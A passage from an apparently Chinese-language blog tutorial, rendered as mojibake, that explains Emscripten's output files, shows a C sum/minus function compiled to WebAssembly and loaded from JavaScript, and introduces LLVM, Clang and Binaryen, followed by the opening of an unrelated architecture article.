<p><code>test.html</code> æ˜¯ Emscripten è‡ªåŠ¨ç”Ÿæˆçš„<strong>å®Œæ•´ HTML é¡µé¢</strong>ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªå¼€ç®±å³ç”¨çš„å‰ç«¯è½½ä½“ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ï¼š</p>
<ul>
<li><strong>ä½œä¸º Wasm/JS ä»£ç çš„è¿è¡Œå®¹å™¨</strong>ï¼šå†…ç½®äº†åŠ è½½ <code>test.js</code>ï¼ˆèƒ¶æ°´ä»£ç ï¼‰çš„é€»è¾‘ï¼Œæ— éœ€ä½ æ‰‹åŠ¨å†™ HTML å¼•å…¥è„šæœ¬ï¼›</li>
<li><strong>æä¾›åŸºç¡€çš„äº¤äº’ç•Œé¢</strong>ï¼šé»˜è®¤åŒ…å«ä¸€ä¸ªç®€å•çš„é¡µé¢ç»“æ„ï¼Œä»¥åŠæ§åˆ¶å°è¾“å‡ºåŒºåŸŸï¼ˆç”¨äºæ˜¾ç¤º C ä»£ç ä¸­ <code>printf</code>/<code>puts</code> ç­‰å‡½æ•°çš„è¾“å‡ºï¼‰ï¼›</li>
<li><strong>ç®€åŒ–æµ‹è¯•æµç¨‹</strong>ï¼šç›´æ¥åœ¨æœ¬åœ°æœåŠ¡å™¨æ‰“å¼€å°±å¯ä»¥è¿è¡Œï¼Œæ— éœ€é¢å¤–ç¼–å†™ HTML ä»£ç ã€‚</li>
</ul>
<h5 data-id="heading-8">test.js</h5>
<p><code>test.js</code> æ˜¯æ•´ä¸ªç¼–è¯‘äº§ç‰©çš„<strong>æ ¸å¿ƒ</strong>ï¼Œä¹Ÿæ˜¯ Emscripten æœ€å…³é”®çš„è¾“å‡ºæ–‡ä»¶ä¹‹ä¸€ï¼Œè¢«ç§°ä¸º â€œèƒ¶æ°´ä»£ç â€ï¼Œä½œç”¨æ˜¯<strong>è¿æ¥ JavaScript ç¯å¢ƒå’Œ Wasm æ¨¡å—</strong>ï¼Œå¡«è¡¥ä¸¤è€…çš„å·®å¼‚ã€‚</p>
<p>å®ƒåŒ…å«ä»¥ä¸‹æ ¸å¿ƒåŠŸèƒ½ï¼ˆæŒ‰æ‰§è¡Œé¡ºåºï¼‰ï¼š</p>
<p>ï¼ˆ1ï¼‰Wasm æ¨¡å—çš„åŠ è½½ä¸å®ä¾‹åŒ–</p>
<p>è‡ªåŠ¨å¤„ç† <code>test.wasm</code>ï¼ˆç¼–è¯‘æ—¶åŒæ­¥ç”Ÿæˆçš„ Wasm æ–‡ä»¶ï¼‰çš„åŠ è½½ã€è§£æå’Œå®ä¾‹åŒ–ï¼Œæ— éœ€ä½ æ‰‹åŠ¨è°ƒç”¨ <code>WebAssembly.instantiate</code>ã€‚</p>
<p>ï¼ˆ2ï¼‰Emscripten è¿è¡Œæ—¶åˆå§‹åŒ–</p>
<p>åˆå§‹åŒ– Wasm è¿è¡Œæ‰€éœ€çš„ç¯å¢ƒï¼š</p>
<ul>
<li>çº¿æ€§å†…å­˜ï¼ˆMemoryï¼‰ç®¡ç†ï¼›</li>
<li>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆMEMFS/IDBFSï¼‰ï¼ˆæ¨¡æ‹Ÿ C çš„æ–‡ä»¶æ“ä½œï¼Œå¦‚ <code>fopen</code>/<code>fwrite</code>ï¼‰ï¼›</li>
<li>ç³»ç»Ÿè°ƒç”¨æ¨¡æ‹Ÿï¼ˆå¦‚ <code>exit</code>/<code>time</code>ï¼‰ï¼›</li>
<li>é”™è¯¯å¤„ç†å’Œæ—¥å¿—è¾“å‡ºã€‚</li>
</ul>
<p>ï¼ˆ3ï¼‰C/JS äº’æ“ä½œæ¡¥æ¢</p>
<ul>
<li>å°è£… C å‡½æ•°çš„è°ƒç”¨é€»è¾‘ï¼šæŠŠ Wasm ä¸­çš„å‡½æ•°ï¼ˆå¦‚ä¸‹åˆ’çº¿å‰ç¼€çš„ <code>_main</code>ï¼‰æ˜ å°„ä¸ºæ›´å‹å¥½çš„ JS è°ƒç”¨æ–¹å¼ï¼›</li>
<li>å¤„ç† C æ ‡å‡†åº“è¾“å‡ºï¼šæŠŠ C ä»£ç ä¸­ <code>printf</code>/<code>puts</code> çš„è¾“å‡ºé‡å®šå‘åˆ° HTML é¡µé¢çš„æ§åˆ¶å°åŒºåŸŸï¼›</li>
<li>æš´éœ²è¿è¡Œæ—¶ APIï¼šå¦‚ <code>ccall</code>/<code>cwrap</code>ï¼ˆç”¨äº JS è°ƒç”¨ C å‡½æ•°ï¼‰ã€<code>FS</code>ï¼ˆæ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼‰ç­‰ã€‚</li>
</ul>
<p>ï¼ˆ4ï¼‰è‡ªåŠ¨æ‰§è¡Œ C çš„ <code>main</code> å‡½æ•°</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>test.js</code> åˆå§‹åŒ–å®Œæˆåä¼šè‡ªåŠ¨è°ƒç”¨ C ä»£ç ä¸­çš„ <code>main</code> å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä½ ç¼–è¯‘çš„ C ç¨‹åºèƒ½ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œã€‚</p>
<p><strong>åœ¨å®è·µä¸­ï¼Œæˆ‘ä»¬ä¸ä¸€å®šéœ€è¦ä½¿ç”¨ç¼–è¯‘ç”Ÿæˆçš„èƒ¶æ°´ä»£ç ï¼Œå¾ˆå¤šæ—¶å€™è‡ªå·±æ‰‹åŠ¨ç®¡ç†wasmæ›´æ–¹ä¾¿ã€‚</strong></p>
<h5 data-id="heading-9">test.wasm</h5>
<p>æ‰§è¡Œ C ä»£ç ç¼–è¯‘åçš„æŒ‡ä»¤ï¼ˆå¦‚ main å‡½æ•°ã€sum å‡½æ•°ï¼‰</p>
<h3 data-id="heading-10">jsè°ƒç”¨wasmå‡½æ•°</h3>
<p>è¿™ä¸ªdemoä¸­æˆ‘ä»¬ä¸ç”Ÿæˆèƒ¶æ°´ä»£ç ï¼Œä½¿ç”¨åŸç”Ÿapiè°ƒç”¨wasmã€‚</p>
<p>å‡†å¤‡cæ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// calc.c</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>
{
    <span class="hljs-keyword">return</span> a + b;
}
<span class="hljs-type">int</span> <span class="hljs-title function_">minus</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>
{
    <span class="hljs-keyword">return</span> a - b;
}
</code></pre>
<p>æ‰§è¡Œç¼–è¯‘</p>
<pre><code class="hljs language-bash" lang="bash">emcc calc.c -o calc.wasm  -s EXPORTED_FUNCTIONS=_sum,_minus --no-entry
</code></pre>
<p>ç¼–å†™htmlå’ŒjsåŠ è½½wasm</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>WASM Calc Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>WASM Calculator<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"output"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
      (<span class="hljs-keyword">async</span> () =&gt; {
        <span class="hljs-comment">// åŠ è½½ wasm æ–‡ä»¶</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">"calc.wasm"</span>);
        <span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">arrayBuffer</span>();
        <span class="hljs-keyword">const</span> wasmModule = <span class="hljs-keyword">await</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title function_">instantiate</span>(buffer);

        <span class="hljs-comment">// å¯¼å‡ºçš„æ–¹æ³•éƒ½åœ¨ instance.exports é‡Œ</span>
        <span class="hljs-keyword">const</span> { sum, minus } = wasmModule.<span class="hljs-property">instance</span>.<span class="hljs-property">exports</span>;
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wasmModule);
        <span class="hljs-comment">// è°ƒç”¨å¹¶æ˜¾ç¤ºç»“æœ</span>
        <span class="hljs-keyword">const</span> a = <span class="hljs-number">7</span>,
          b = <span class="hljs-number">3</span>;
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"output"</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`
        sum(<span class="hljs-subst">${a}</span>, <span class="hljs-subst">${b}</span>) = <span class="hljs-subst">${sum(a, b)}</span>&lt;br&gt;
        minus(<span class="hljs-subst">${a}</span>, <span class="hljs-subst">${b}</span>) = <span class="hljs-subst">${minus(a, b)}</span>
      `</span>;
      })();
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7310ef4285ab46ec9ef663bfc23a7556~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5biD5YiX55Gf5Yac55qE5pif56m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768476644&amp;x-signature=7QbC3%2Be7OrW%2BVLf9Leew48hhPLQ%3D" alt="image.png" loading="lazy"/></p>
<p>æ³¨ï¼š</p>
<ul>
<li>åœ¨ C è¯­è¨€çš„ ABIï¼ˆåº”ç”¨äºŒè¿›åˆ¶æ¥å£ï¼‰è§„èŒƒé‡Œï¼Œ<strong>å¤§å¤šæ•°å¹³å°çš„é“¾æ¥å™¨ä¼šä¸º C å…¨å±€ç¬¦å·åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿ <code>_</code> å‰ç¼€</strong>ã€‚<br/>
Emscripten ä¹Ÿéµå¾ªäº†è¿™ä¸ªä¼ ç»Ÿã€‚ä½ å†™çš„ <code>int sum(int a, int b)</code>ï¼Œç¼–è¯‘åå®é™…å¯¼å‡ºçš„ç¬¦å·æ˜¯ <code>_sum</code></li>
<li>ä¸€èˆ¬æƒ…å†µä¸‹ç¼–è¯‘æ—¶ä¼šæ‰¾mainå‡½æ•°ï¼Œå¦‚æœä¸éœ€è¦mainï¼Œå¯ä»¥åŠ å‚æ•°<code>--no-entry</code>,å¦åˆ™ç¼–è¯‘ä¼šæŠ¥é”™</li>
<li>EXPORTED_FUNCTIONSå‚æ•°ä¸æ˜¯å¿…é¡»ï¼Œç¼–è¯‘æ—¶å¯ä»¥æ ¹æ®æ–‡ä»¶å†…å®¹ç”Ÿæˆå¯¼å‡ºçš„å‡½æ•°ã€‚ä½†å¦‚æœå‡½æ•°<strong>æ—¢æ²¡æœ‰è¢« C ä»£ç è°ƒç”¨ï¼Œä¹Ÿæ²¡æœ‰è¢«æ­£ç¡®å¯¼å‡º</strong>ï¼ŒEmscripten å¯èƒ½ä¼šè®¤ä¸ºå®ƒæ²¡ç”¨ï¼Œç›´æ¥å»æ‰å®ƒã€‚å› æ­¤å¯ä»¥ä¿®æ”¹ä»£ç ï¼Œæ·»åŠ <code>EMSCRIPTEN_KEEPALIVE</code></li>
</ul>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// calc.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emscripten/emscripten.h&gt;</span></span>

EMSCRIPTEN_KEEPALIVE
<span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>
{
    <span class="hljs-keyword">return</span> a + b;
}
EMSCRIPTEN_KEEPALIVE
<span class="hljs-type">int</span> <span class="hljs-title function_">minus</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>
{
    <span class="hljs-keyword">return</span> a - b;
}

</code></pre>
<p>æ‰§è¡Œ<code>emcc calc.c -o calc.wasm  -s  --no-entry</code>ä¸€æ ·èƒ½å¾—åˆ°ä¸¤ä¸ªå‡½æ•°</p>
<h4 data-id="heading-11"/>
<h2 data-id="heading-12">å·¥ä½œåŸç†æ¦‚è§ˆå’ŒLLVM/Clangä»‹ç»</h2>
<p>Emscripten çš„ç¼–è¯‘æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>å‰ç«¯ç¼–è¯‘</strong>ï¼šClang å°† C/C++ æºç ç¼–è¯‘ä¸º LLVM IRã€‚</li>
<li><strong>ä¸­é—´ä¼˜åŒ–</strong>ï¼šLLVM ä¸ Binaryen å¯¹ IR åšä»£ç ç²¾ç®€ã€å¾ªç¯ä¼˜åŒ–ã€æ­»ä»£ç æ¶ˆé™¤ç­‰ã€‚</li>
<li><strong>åç«¯ç”Ÿæˆ</strong>ï¼šè¾“å‡º Wasm äºŒè¿›åˆ¶æ¨¡å—ï¼ˆ.wasmï¼‰ä¸ JavaScript èƒ¶æ°´ä»£ç ï¼ˆå¤„ç† Wasm åŠ è½½ã€å†…å­˜ç®¡ç†ã€API ç»‘å®šï¼‰ï¼Œå¯é€‰ç›´æ¥ç”Ÿæˆå¯è¿è¡Œçš„ HTMLã€‚</li>
</ol>

<pre><code class="hljs language-javascript" lang="javascript">C/C++ æºç 
   â†“
<span class="hljs-title class_">Clang</span>ï¼ˆ<span class="hljs-variable constant_">LLVM</span> å‰ç«¯ï¼‰ â†’ ç”Ÿæˆ <span class="hljs-variable constant_">LLVM</span> <span class="hljs-variable constant_">IR</span>
   â†“
<span class="hljs-variable constant_">LLVM</span> ä¼˜åŒ–å™¨ â†’ ä¼˜åŒ– <span class="hljs-variable constant_">LLVM</span> <span class="hljs-variable constant_">IR</span>
   â†“
<span class="hljs-variable constant_">LLVM</span> åç«¯ â†’ ç”Ÿæˆ åŸå§‹ <span class="hljs-title class_">WebAssembly</span> æ¨¡å—
   â†“
<span class="hljs-title class_">Binaryen</span>ï¼ˆwasm-optï¼‰ â†’ ä¼˜åŒ– <span class="hljs-title class_">Wasm</span> 
   â†“
æœ€ç»ˆè¾“å‡ºï¼šä¼˜åŒ–åçš„ .<span class="hljs-property">wasm</span> 
</code></pre>
<p>è¿™é‡Œå‡ºç°äº†ä¸€äº›åè¯ï¼šå‰ç«¯/åç«¯/Clang/LLVM/IRï¼Œä¸‹é¢ç®€å•ä»‹ç»ä¸‹è¿™äº›æ¦‚å¿µã€‚</p>
<h3 data-id="heading-13">1. IRï¼ˆIntermediate Representationï¼Œä¸­é—´è¡¨ç¤ºï¼‰</h3>
<p>IR æ˜¯ç¼–è¯‘å™¨åœ¨<strong>å‰ç«¯ï¼ˆæºç è§£æï¼‰</strong> å’Œ<strong>åç«¯ï¼ˆç›®æ ‡ä»£ç ç”Ÿæˆï¼‰</strong> ä¹‹é—´çš„ â€œä¸­é—´è¯­è¨€â€ï¼Œæ˜¯è¿æ¥ä¸åŒæºç è¯­è¨€å’Œä¸åŒç›®æ ‡å¹³å°çš„æ¡¥æ¢ã€‚æ ¸å¿ƒç‰¹ç‚¹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¸æºç è¯­è¨€æ— å…³ï¼šä¸ç®¡æ˜¯ C/C++ã€Rustã€Go è¿˜æ˜¯ Swiftï¼Œåªè¦èƒ½è¢« LLVM å‰ç«¯ç¼–è¯‘ï¼Œæœ€ç»ˆéƒ½ä¼šè½¬æ¢æˆç»Ÿä¸€çš„ IRã€‚</li>
<li>ä¸ç›®æ ‡å¹³å°æ— å…³ï¼šIR ä¸åŒ…å«ä»»ä½• CPU æ¶æ„ã€æ“ä½œç³»ç»Ÿçš„ç‰¹æœ‰æŒ‡ä»¤ï¼Œåªæè¿° â€œè®¡ç®—é€»è¾‘â€ã€‚</li>
<li>åˆ†å±‚è®¾è®¡ï¼šLLVM IR åˆ†ä¸º <strong>LLVM IRï¼ˆæ–‡æœ¬ / äºŒè¿›åˆ¶å½¢å¼ï¼‰</strong> å’Œæ›´åº•å±‚çš„ <strong>Machine IR</strong>ï¼Œå‰è€…ç”¨äºè·¨å¹³å°ä¼˜åŒ–ï¼Œåè€…ç”¨äºé’ˆå¯¹å…·ä½“æ¶æ„ç”Ÿæˆæœºå™¨ç ã€‚</li>
</ul>
<h3 data-id="heading-14">2. LLVMï¼ˆLow Level Virtual Machineï¼‰</h3>
<p><strong>LLVM</strong>ï¼ˆLow Level Virtual Machineï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„ç¼–è¯‘å™¨åŸºç¡€è®¾æ–½é¡¹ç›®ï¼Œ<br/>
å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€å¥—<strong>ç¼–è¯‘å™¨å‰ç«¯å’Œåç«¯çš„é›†åˆ</strong>ï¼Œæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€å’Œç›®æ ‡å¹³å°ã€‚</p>
<ul>
<li><strong>å‰ç«¯</strong>ï¼šå¦‚ Clangï¼ŒæŠŠ C/C++ è½¬æˆ LLVM IRï¼ˆä¸­é—´è¡¨ç¤ºï¼‰</li>
<li><strong>åç«¯</strong>ï¼šæŠŠ LLVM IR è½¬æˆç›®æ ‡æœºå™¨ç ï¼ˆå¦‚ x86ã€ARMã€WebAssemblyï¼‰</li>
</ul>
<h4 data-id="heading-15">Clang</h4>
<p>Clang æ˜¯ <strong>LLVM é¡¹ç›®çš„ä¸€ä¸ªæ ¸å¿ƒå­ç»„ä»¶</strong>ï¼Œæœ¬è´¨æ˜¯ LLVM ç”Ÿæ€çš„<strong>C/C++/Objective-C å‰ç«¯ç¼–è¯‘å™¨</strong>ï¼ŒäºŒè€…æ˜¯<strong>æ¡†æ¶ä¸ç»„ä»¶</strong>çš„å…³ç³» â€”â€”LLVM æä¾›é€šç”¨çš„ç¼–è¯‘åŸºç¡€è®¾æ–½ï¼ŒClang è´Ÿè´£å°† C ç³»æºç è½¬æ¢æˆ LLVM IRï¼Œå†ç”± LLVM çš„ä¼˜åŒ–å™¨å’Œåç«¯å®Œæˆåç»­æµç¨‹ã€‚</p>
<h3 data-id="heading-16">3. Binaryen</h3>
<p><strong>Binaryen</strong> æ˜¯ä¸€ä¸ªä¸“æ³¨äº WebAssemblyï¼ˆWASMï¼‰çš„<strong>å·¥å…·é“¾åº“å’Œä¼˜åŒ–å™¨</strong>ï¼Œ<br/>
ç”± WebAssembly æ ¸å¿ƒå›¢é˜Ÿæˆå‘˜å¼€å‘å’Œç»´æŠ¤ï¼ˆä¸»è¦ç”¨ C++ å®ç°ï¼Œå¸¦æœ‰ JS/Python æ¥å£ï¼‰ã€‚<br/>
å®ƒçš„ç›®æ ‡æ˜¯è®© WebAssembly ä»£ç <strong>æ›´å°ã€æ›´å¿«ã€æ›´é«˜æ•ˆ</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç°ä»£è½¯ä»¶å¼€å‘ä¸­å¸¸ç”¨æ¶æ„çš„ç³»ç»Ÿæ¢³ç†ä¸å®è·µæŒ‡å—]]></title>    <link>https://juejin.cn/post/7592818202716979219</link>    <guid>https://juejin.cn/post/7592818202716979219</guid>    <pubDate>2026-01-08T10:04:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592818202716979219" data-draft-id="7592815497847685183" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç°ä»£è½¯ä»¶å¼€å‘ä¸­å¸¸ç”¨æ¶æ„çš„ç³»ç»Ÿæ¢³ç†ä¸å®è·µæŒ‡å—"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T10:04:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç°ä»£è½¯ä»¶å¼€å‘ä¸­å¸¸ç”¨æ¶æ„çš„ç³»ç»Ÿæ¢³ç†ä¸å®è·µæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:04:55.000Z" title="Thu Jan 08 2026 10:04:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä»Šå¤©çš„è½¯ä»¶å¼€å‘å®è·µä¸­ï¼Œâ€œæ¶æ„â€å·²ç»ä¸åªæ˜¯æŠ€æœ¯é€‰å‹é—®é¢˜ï¼Œè€Œæ˜¯å…³ä¹å›¢é˜Ÿåä½œæ•ˆç‡ã€ç³»ç»Ÿå¯æ¼”è¿›æ€§ä»¥åŠä¸šåŠ¡ç«äº‰åŠ›çš„æ ¸å¿ƒå†³ç­–ã€‚å¾ˆå¤šåˆå­¦è€…æ¥è§¦æ¶æ„æ—¶ï¼Œå¾€å¾€åªçœ‹åˆ°é›¶æ•£çš„åè¯ï¼šåˆ†å±‚ã€MVCã€å¾®æœåŠ¡ã€äº‹ä»¶é©±åŠ¨ã€CQRSã€Serverlessâ€¦â€¦å´å¾ˆéš¾æŠŠå®ƒä»¬ä¸²æˆä¸€æ¡æ¸…æ™°çš„æ¼”è¿›ä¸»çº¿ï¼Œæ›´éš¾è½åˆ°å®é™…é¡¹ç›®ä¸­â€œè¯¥æ€ä¹ˆé€‰ã€æ€ä¹ˆç”¨â€ã€‚</p>
